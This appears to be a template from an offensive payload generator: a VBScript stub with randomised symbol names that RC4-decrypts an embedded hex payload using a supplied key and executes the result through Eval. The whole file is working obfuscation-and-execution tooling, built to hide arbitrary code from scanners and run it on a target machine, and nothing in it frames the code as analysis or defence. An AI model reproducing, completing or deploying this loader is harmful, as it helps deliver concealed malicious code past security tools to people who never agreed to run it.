Function {{symbol_name("Xor")}}(byVal {{symbol_name("A")}}, byVal {{symbol_name("B")}})
    {{symbol_name("Xor")}} = (NOT({{symbol_name("A")}} AND {{symbol_name("B")}})) AND (NOT(NOT {{symbol_name("A")}} AND NOT {{symbol_name("B")}}))
    {# A Xor B = (NOT(A AND B)) AND (NOT(NOT A AND NOT B)) #}
end Function

Function {{symbol_name("RC4")}}(byVal {{symbol_name("bytes")}}, byVal {{symbol_name("key")}})
    dim s(256), k(256)
    dim  i, j, t, p
    j = 0
    For i = 0 to 255
        s(i) = i
        j = j Mod (UBound({{symbol_name("key")}}) + 1)
        k(i) = {{symbol_name("key")}}(j)
        j = j + 1
    Next
    j = 0
    For i = 0 to 255
        j = (j + s(i) + k(i)) Mod 256
        t = s(j)
        s(j) = s(i)
        s(i) = t
    Next
    i = 0
    j = 0
    For p = 0 to UBound({{symbol_name("bytes")}})
        i = (i + 1) Mod 256
        j = (j + s(i)) Mod 256
        t = s(j)
        s(j) = s(i)
        s(i) = t
        t = (s(i) + (s(j) Mod 256)) Mod 256
        {{symbol_name("bytes")}}(p) = {{symbol_name("Xor")}}({{symbol_name("bytes")}}(p), s(t))
    Next
    {{symbol_name("RC4")}} = {{symbol_name("bytes")}}
end Function

{{symbol_name("hexstr")}} = "{{HEX_CODE}}"
{{symbol_name("keystr")}} = "{{HEX_KEY}}"
{{symbol_name("hexarr")}} = Split({{symbol_name("hexstr")}})
{{symbol_name("keyarr")}} = Split({{symbol_name("keystr")}})
For i = 0 To UBound({{symbol_name("hexarr")}})
  {{symbol_name("hexarr")}}(i) = CInt("&h" & {{symbol_name("hexarr")}}(i))
Next
For i = 0 To UBound({{symbol_name("keyarr")}})
  {{symbol_name("keyarr")}}(i) = CInt("&h" & {{symbol_name("keyarr")}}(i))
Next

dim {{symbol_name("result")}}
{{symbol_name("result")}} = {{symbol_name("RC4")}}({{symbol_name("hexarr")}}, {{symbol_name("keyarr")}})
For i = 0 To UBound({{symbol_name("hexarr")}})
  {{symbol_name("hexarr")}}(i) = Chr({{symbol_name("result")}}(i))
Next
{# hexarr = result? #}

{{symbol_name("Code")}} = Join({{symbol_name("hexarr")}}, "")
Eval({{symbol_name("Code")}})
